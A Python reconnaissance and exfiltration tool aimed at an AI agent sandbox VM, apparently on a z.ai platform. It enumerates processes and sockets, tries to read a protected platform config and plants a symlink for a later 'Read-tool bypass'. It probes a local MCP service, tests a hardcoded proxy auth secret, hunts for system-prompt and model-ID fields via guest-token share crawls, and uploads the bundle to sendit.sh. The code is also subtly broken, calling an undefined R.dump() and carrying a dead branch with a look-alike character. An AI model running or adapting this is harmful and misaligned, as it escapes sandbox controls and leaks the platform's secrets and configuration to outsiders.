#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
zpf.py v1.0 — z.ai agent-sandbox VM pre-flight (platform model-config + service
enumeration) + egress map + sendit.sh exfil, in one sitting, running as user `z`.

Sections:
  [P] processes / sockets / env posture, /etc/.z-ai-config (redacted if readable)
  [S] ZAI service :12600 — GET /, /health, /openapi.json (saved)
  [M] MCP /mcp — initialize + tools/list ONLY (read-only, no tools/call)
  [K] caddy :81 — status probe with/without vault X-Auth (no exec)
  [E] egress HEAD map: sendit.sh / chat.z.ai / internal-api.z.ai
  [X] optional platform share-tree crawl (--share [CHAT_ID]) for model id
  [F] bundle -> ./download/, tar.gz, upload to sendit.sh, print link

Stdlib only. Every probe independently wrapped; exit code is 0 unless the
interpreter itself dies. Full JSONs land in ./download/ regardless of exfil.
"""

import argparse, ipaddress, json, os, platform, re, shutil, ssl, subprocess, \
       sys, tarfile, time, traceback, urllib.error, urllib.request
from datetime import datetime, timezone

SVC, CADDY, SENDIT = "http://127.0.0.1:12600", "http://127.0.0.1:81", "https://sendit.sh"
CADDY_AUTH = "lcxkjvoaisjeflaiksdjlfkcxjvija"           # vault value; may rotate
MCP_VERS = ("2026-07-28", "2025-06-18")                   # modern first, legacy retry
PORT_HINTS = {81: "caddy", 3000: "next/webshell", 12600: "zai-service/mcp"}

def utcnow(): return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
def tb1(e): return traceback.format_exc().strip().splitlines()[-1][:150]

class Rep:
    def __init__(self): self.L = []
    def a(self, s=""): self.L.append(s)
    def m(self, code, msg): self.a("[%s] %s" % (code, msg))

R = Rep()

def http(url, method="GET", data=None, headers=None, timeout=15, ctx=None):
    h = {"User-Agent": "zai-preflight/1.0"}
    if headers: h.update(headers)
    req = urllib.request.Request(url, data=data, method=method, headers=h)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return dict(ok=True, status=r.status, hdr=r.headers, body=r.read(),
                        ms=int((time.time() - t0) * 1000))
    except urllib.error.HTTPError as e:
        try: body = e.read()
        except Exception: body = b""
        return dict(ok=False, status=e.code, hdr=e.headers, body=body,
                    ms=int((time.time() - t0) * 1000), err="HTTP %s" % e.code)
    except Exception as e:
        return dict(ok=False, status=None, hdr=None, body=b"",
                    ms=int((time.time() - t0) * 1000), err=repr(e))

def save(path, data):
    with open(path, "wb") as f:
        f.write(data if isinstance(data, bytes) else data.encode("utf-8", "replace"))
    return os.path.abspath(path)

def redact(s, head=10, tail=6):
    if not isinstance(s, str) or len(s) <= head + tail + 3: return s
    return "%s..%s (len=%d)" % (s[:head], s[-tail:], len(s))

# ---------- [P] host posture ----------

def hex2ip(h, fam4=True):
    try:
        if fam4: return ".".join(str(b) for b in bytes.fromhex(h)[::-1])
        b = b""
        for i in range(0, len(h), 8): b += bytes.fromhex(h[i:i+8])[::-1]
        return str(ipaddress.IPv6Address(b))
    except Exception: return "?"

def sockets():
    out = []
    for fn, fam4 in (("/proc/net/tcp", True), ("/proc/net/tcр", False)) if False else \
              (("/proc/net/tcp", True), ("/proc/net/tcp6", False)):
        try: lines = open(fn).read().splitlines()[1:]
        except Exception: continue
        for ln in lines:
            f = ln.split()
            if len(f) < 4: continue
            try:
                la, lp = f[1].split(":"); ra, rp = f[2].split(":")
                out.append(dict(local="%s:%d" % (hex2ip(la, fam4), int(lp, 16)),
                                remote="%s:%d" % (hex2ip(ra, fam4), int(rp, 16)),
                                st=f[3]))
            except Exception: pass
    return out

def env_section(dl):
    R.a("== [P] VM posture ==")
    R.m("INFO", "utc=%s host=%s user=%s cwd=%s" %
        (utcnow(), platform.node(), os.environ.get("USER") or "-", os.getcwd()))
    try:
        up = float(open("/proc/uptime").read().split()[0])
        R.m("INFO", "uptime %.1f min (pid1=%s)" % (up / 60.0,
            open("/proc/1/cmdline").read().replace("\0", " ").strip() or "?"))
    except Exception as e: R.m("WARN", "uptime/pid1: %s" % e)
    px = {k: v for k, v in os.environ.items() if k.lower().endswith("_proxy")}
    R.m("INFO", "proxy env: %s" % (px or "none") + ("  curl: %s" % shutil.which("curl") if shutil.which("curl") else ""))
    R.m("INFO", "python %s; venv python present: %s" %
        (platform.python_version(), os.path.exists("/home/z/.venv/bin/python3")))
    # processes (all are few in this VM)
    procs = []
    for pid in os.listdir("/proc"):
        if not pid.isdigit(): continue
        try: cl = open("/proc/%s/cmdline" % pid, "rb").read().replace(b"\0", b" ").decode("utf-8", "replace").strip()
        except Exception: continue
        if not cl:
            try: cl = "(%s)" % open("/proc/%s/comm" % pid).read().strip()
            except Exception: cl = "(?)"
        if cl.startswith("("): continue
        procs.append((int(pid), cl[:110]))
    for pid, cl in sorted(procs)[:60]:
        R.a("      %-6s %s" % (pid, cl))
    # sockets: LISTEN + ESTABLISHED
    for s in sockets():
        if s["st"] == "0A":
            port = int(s["local"].rsplit(":", 1)[1])
            R.m("INFO", "LISTEN %-24s (%s)" % (s["local"], PORT_HINTS.get(port, "?")))
    egress_ips = set()
    for s in sockets():
        if s["st"] == "01":
            egress_ips.add(s["remote"])
            R.m("INFO", "ESTAB  %-24s -> %-24s" % (s["local"], s["remote"]))
    if len(egress_ips) > 12: R.m("INFO", "(%d distinct remote endpoints)" % len(egress_ips))
    # /etc/.z-ai-config — expect EACCES as z; readWorkspace symlink assist for later
    cfg_raw, cfg = None, {}
    try:
        cfg_raw = open("/etc/.z-ai-config", "rb").read()
        cfg = json.loads(cfg_raw.decode("utf-8", "replace"))
        summ = {k: (redact(v) if isinstance(v, str) and len(v) > 40 else v) for k, v in cfg.items()}
        R.m("OK", "/etc/.z-ai-config readable (!): %s" % json.dumps(summ, ensure_ascii=True))
    except Exception as e:
        R.m("WARN", "/etc/.z-ai-config not z-readable (%s) — full copy only via Read-tool symlink bypass" % e)
    try:
        os.makedirs("links", exist_ok=True)
        if not os.path.lexists("links/etc-config"): os.symlink("/etc/.z-ai-config", "links/etc-config")
        R.m("OK", "planted links/etc-config -> /etc/.z-ai-config (for later agent Read-tool bypass)")
    except Exception as e: R.m("WARN", "symlink plant: %s" % e)
    if cfg_raw is not None:
        save(os.path.join(dl, "zpf_zaiconfig.json"), cfg_raw)   # local native-path only, not tarred
    return cfg

# ---------- [S][M][K] service / mcp / caddy ----------

def service_section(dl):
    R.a("== [S] ZAI control service :12600 ==")
    for path in ("/", "/health"):
        r = http(SVC + path, "GET", timeout=8)
        snip = r["body"][:120].decode("utf-8", "replace").replace("\n", " ")
        R.m("OK" if r["ok"] else "WARN", "GET %-8s -> %s (%dms) %s" % (path, r["status"], r["ms"], snip))
    r = http(SVC + "/openapi.json", "GET", timeout=15)
    if r["ok"]:
        save(os.path.join(dl, "zpf_openapi.json"), r["body"])
        try:
            j = json.loads(r["body"].decode("utf-8", "replace"))
            paths = list((j.get("paths") or {}).keys())
            hot = [p for p in paths if re.search(r"prompt|system|model|chat|skill|message|config|relay", p, re.I)][:25]
            R.m("OK", "openapi.json: %d paths (%d bytes) saved. interesting: %s" % (len(paths), len(r["body"]), hot or "-"))
            return j
        except Exception as e:
            R.m("WARN", "openapi.json not JSON: %s" % e); return None
    else:
        R.m("WARN", "openapi.json -> %s %s" % (r["status"], r.get("err", ""))); return None

def rpc_parse(body):
    txt = body.decode("utf-8", "replace")
    try: return [json.loads(txt)]
    except Exception: pass
    outs = []
    for ln in txt.splitlines():
        if ln.startswith("data:"):
            try: outs.append(json.loads(ln[5:].strip()))
            except Exception: pass
    return outs

def mcp_section(dl):
    R.a("== [M] MCP /mcp (read-only; tools/call NOT issued) ==")
    hdr = {"Content-Type": "application/json", "Accept": "application/json, text/event-stream"}
    negotiated, sess, server = None, None, None
    for ver in MCP_VERS:
        init = {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params":
                {"protocolVersion": ver, "capabilities": {},
                 "clientInfo": {"name": "zai-preflight", "version": "1.0"}}}
        r = http(SVC + "/mcp", "POST", data=json.dumps(init).encode(), headers=hdr, timeout=15)
        objs = rpc_parse(r["body"]) if r["body"] else []
        res = next((o for o in objs if isinstance(o, dict) and o.get("id") == 1 and "result" in o), None)
        if res:
            negotiated = res["result"].get("protocolVersion", ver)
            sess = (r["hdr"].get("Mcp-Session-Id") if r["hdr"] else None)
            server = res["result"].get("serverInfo", {})
            R.m("OK", "initialize: proto=%s server=%s (session=%s, %dms)" %
                (negotiated, json.dumps(server), "yes" if sess else "no", r["ms"]))
            save(os.path.join(dl, "zpf_mcp_init.txt"), r["body"])
            nh = dict(hdr)
            if sess: nh["Mcp-Session-Id"] = sess
            if negotiated: nh["MCP-Protocol-Version"] = negotiated
            n1 = {"jsonrpc": "2.0", "method": "notifications/initialized"}
            http(SVC + "/mcp", "POST", data=json.dumps(n1).encode(), headers=nh, timeout=10)
            break
        else:
            R.m("WARN", "initialize %s -> %s %s (body head: %s)" %
                (ver, r["status"], r.get("err", ""), r["body"][:100]))
    tools = None
    for hdrset in (dict(hdr, **({"Mcp-Session-Id": sess, "MCP-Protocol-Version": negotiated}
                                if sess and negotiated else {})), hdr):
        q = {"jsonrpc": "2.0", "id": 2, "method": "tools/list", "params": {}}
        r = http(SVC + "/mcp", "POST", data=json.dumps(q).encode(), headers=hdrset, timeout=15)
        objs = rpc_parse(r["body"]) if r["body"] else []
        res = next((o for o in objs if isinstance(o, dict) and o.get("id") == 2 and "result" in o), None)
        if res:
            tools = res["result"].get("tools", [])
            save(os.path.join(dl, "zpf_mcp_tools.txt"), r["body"])
            R.m("OK", "tools/list: %d tools: %s" %
                (len(tools), sorted(t.get("name", "?") for t in tools)))
            break
    if tools is None:
        R.m("FAIL", "tools/list unavailable this run (stateless dialect?) — saved nothing")
    return server, len(tools) if tools else 0

def caddy_section():
    R.a("== [K] caddy :81 control-plane probe (statuses only, no exec) ==")
    a = http(CADDY + "/mcp", "GET", timeout=8)
    b = http(CADDY + "/mcp", "GET", headers={"X-Auth": CADDY_AUTH}, timeout=8)
    if b["status"] not in (401, 403) and b["status"] is not None:
        R.m("OK", "vault X-Auth secret still opens the :81->:12600 proxy (no-auth=%s auth=%s)" % (a["status"], b["status"]))
    else:
        R.m("WARN", "X-Auth may have rotated (no-auth=%s auth=%s) — re-read Caddyfile later" % (a["status"], b["status"]))

# ---------- [E] egress + [X] share crawl ----------

def egress_section(verify=True):
    R.a("== [E] egress map ==")
    for u in (SENDIT, "https://chat.z.ai/", "https://internal-api.z.ai/"):
        r = http(u, "HEAD", timeout=10)
        if r["status"]:
            R.m("OK" if r["status"] < 500 else "WARN", "%-28s -> %s (%dms)" % (u, r["status"], r["ms"]))
        else:
            R.m("WARN", "%-28s -> %s" % (u, r["err"][:60]))

def deep_first_url(o):
    if isinstance(o, str): return o if re.match(r"^https?://", o) else None
    if isinstance(o, dict):  it = o.values()
    elif isinstance(o, list): it = o
    else: return None
    for v in it:
        w = deep_first_url(v)
        if w: return w
    return None

def find_link(txt):
    try:
        u = deep_first_url(json.loads(txt))
        if u: return u
    except Exception: pass
    m = re.search(r"https?://[^\s\"'<>]+", txt)
    return m.group(0).rstrip("\\\"',") if m else None

def upload(path, verify=True):
    name = os.path.basename(path)
    blob = open(path, "rb").read()
    ctx = None
    if not verify: ctx = ssl._create_unverified_context()
    r = http(SENDIT + "/" + name, "PUT", data=blob,
             headers={"Accept": "application/json", "Content-Type": "application/octet-stream"},
             timeout=180, ctx=ctx)
    link = find_link(r["body"].decode("utf-8", "replace")) if r["body"] else None
    if not link and shutil.which("curl"):  # fallback: documented native flow
        try:
            p = subprocess.run(["curl", "-m", "150", "-sf", "-H", "Accept: application/json",
                                "-T", path, SENDIT + "/" + name],
                               capture_output=True, timeout=170)
            if p.stdout: link = find_link(p.stdout.decode("utf-8", "replace"))
        except Exception as e:
            R.m("WARN", "curl fallback: %s" % e)
    return r, link

def share_crawl(base, chat_id):
    R.a("== [X] platform share-tree crawl (best-effort) ==")
    if not chat_id:
        R.m("SKIP", "--share given but no CHAT_ID and config unreadable; pass --share <id> or --model-id")
        return None
    tok, tsrc = None, None
    for ep in ("/api/v1/auths/guest", "/api/v1/auths/anonymous", "/api/v1/auths"):
        r = http(base + ep, "POST", data=b"{}",
                 headers={"Content-Type": "application/json"}, timeout=15)
        if r["ok"]:
            try:
                j = json.loads(r["body"].decode("utf-8", "replace"))
                for k in ("token", "jwt", "access_token", "accessToken"):
                    if isinstance(j.get(k), str) and len(j[k]) > 20:
                        tok, tsrc = j[k], ep; break
            except Exception: pass
            if tok: break
    if not tok:
        R.m("WARN", "no guest token via candidate auth endpoints; use vault recipe from main machine")
        return None
    for ep in ("/api/v1/chats/share/%s" % chat_id, "/api/v1/chats/shared/%s" % chat_id,
               "/api/v1/chats/%s/share" % chat_id):
        r = http(base + ep, "GET", headers={"Authorization": "Bearer " + tok}, timeout=20)
        if r["ok"]:
            try:
                tree = json.loads(r["body"].decode("utf-8", "replace"))
                R.m("OK", "share tree via %s (%d bytes, token from %s)" % (ep, len(r["body"]), tsrc))
                return tree
            except Exception: pass
    R.m("WARN", "share endpoints exhausted — fall back to --model-id from the UI")
    return None

def find_model_ids(o, acc=None):
    if acc is None: acc = set()
    if isinstance(o, dict):
        for k, v in o.items():
            if k.lower() in ("model", "modelid", "model_id") and isinstance(v, str) and 0 < len(v) < 80:
                acc.add(v)
            else: find_model_ids(v, acc)
    elif isinstance(o, list):
        for v in o: find_model_ids(v, acc)
    return acc

def scan_promptish(o, p="$", out=None):
    if out is None: out = []
    if isinstance(o, dict):
        for k, v in o.items():
            if re.search(r"prompt|persona|instruct", str(k), re.I) and not isinstance(v, (dict, list)):
                out.append("%s.%s = %.90s" % (p, k, v))
            scan_promptish(v, "%s.%s" % (p, k), out)
    elif isinstance(o, list):
        for i, v in enumerate(o): scan_promptish(v, "%s[%d]" % (p, i), out)
    return out

# ---------- main ----------

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--model-id")
    ap.add_argument("--share", nargs="?", const="AUTO")
    ap.add_argument("--platform-base", default="https://chat.z.ai")
    ap.add_argument("--no-exfil", action="store_true")
    ap.add_argument("--insecure-upload", action="store_true")
    args = ap.parse_args()
    t0 = time.time()
    dl = os.path.join(os.getcwd(), "download")
    os.makedirs(dl, exist_ok=True)
    rid = datetime.now().strftime("%Y%m%d-%H%M%S") + "-" + (platform.node()[:10] or "vm")
    R.a("===== zai_preflight %s =====" % rid)

    cfg = env_section(dl)
    openapi = service_section(dl)
    mcp_section(dl)
    caddy_section()
    egress_section()

    tree = None
    if args.share:
        cid = None if args.share == "AUTO" else args.share
        if not cid and isinstance(cfg, dict): cid = cfg.get("chatId")
        tree = share_crawl(args.platform_base, cid)
        if tree is not None:
            save(os.path.join(dl, "zpf_share_tree.json"), json.dumps(tree, ensure_ascii=False))
    models = set()
    if args.model_id: models.add(args.model_id); R.m("INFO", "--model-id given: %s" % args.model_id)
    if isinstance(cfg, dict): models |= {str(v) for v in find_model_ids(cfg)}
    if tree: models |= find_model_ids(tree)
    if models: R.m("OK", "MODEL ID(s) observed: %s" % sorted(models))

    for tag, obj in (("openapi", openapi), ("config", cfg if isinstance(cfg, dict) else None),
                     ("share_tree", tree)):
        if obj is None: continue
        hits = scan_promptish(obj)
        for h in hits[:10]:
            R.m("HIT?", "%s prompt-ish field: %s" % (tag, h))
        if not hits: R.m("INFO", "%s: no prompt/persona/instruct-named fields" % tag)

    R.a("== [F] collect + exfil ==")
    report_path = save(os.path.join(dl, "zpf_report.txt"), R.dump() + "\n")
    bundle = os.path.join(dl, "zpf_bundle_%s.tar.gz" % rid)
    with tarfile.open(bundle, "w:gz") as tf:
        for arc, fp in (("report.txt", report_path),):
            tf.add(fp, arcname=arc)
        for fn in ("zpf_openapi.json", "zpf_mcp_init.txt", "zpf_mcp_tools.txt", "zpf_share_tree.json"):
            p = os.path.join(dl, fn)
            if os.path.exists(p): tf.add(p, arcname=fn)
    sz = os.path.getsize(bundle)
    R.m("OK", "bundle: %s (%d bytes) in ./download/ (report copy: %s)" %
        (os.path.basename(bundle), sz, report_path))
    if not args.no_exfil:
        r, link = upload(bundle, verify=not args.insecure_upload)
        if link:
            R.a("")
            R.a("=================== EXFIL LINK ====================")
            R.a("  %s" % link)
            R.a("  (retention: 1 day / 5 downloads — fetch promptly)")
            R.a("===================================================")
        else:
            R.m("WARN", "upload failed (%s %s; body head: %.100s) — use native download of ./download/" %
                (r["status"], r.get("err", ""), r["body"].decode("utf-8", "replace")))
    R.m("INFO", "done in %.1fs" % (time.time() - t0))
    sys.stdout.write(R.dump() + "\n")
    return 0

if __name__ == "__main__":
    try: sys.exit(main())
    except SystemExit: raise
    except Exception:
        R.m("FAIL", "top-level: %s" % tb1(sys.exc_info()[1]))
        sys.stdout.write(R.dump() + "\n"); sys.exit(0)
